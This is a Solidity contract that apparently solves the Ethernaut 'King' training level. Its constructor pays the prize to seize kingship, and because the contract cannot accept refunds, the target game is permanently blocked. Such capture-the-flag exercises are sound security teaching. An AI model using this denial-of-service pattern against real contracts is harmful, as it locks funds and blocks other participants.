// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/King.sol';

contract KingSolution {
  constructor(address targetAddress) payable {
    King target = King(payable(targetAddress));
    (bool success, ) = payable(targetAddress).call{value: target.prize()}("");
    require(success);
  }
}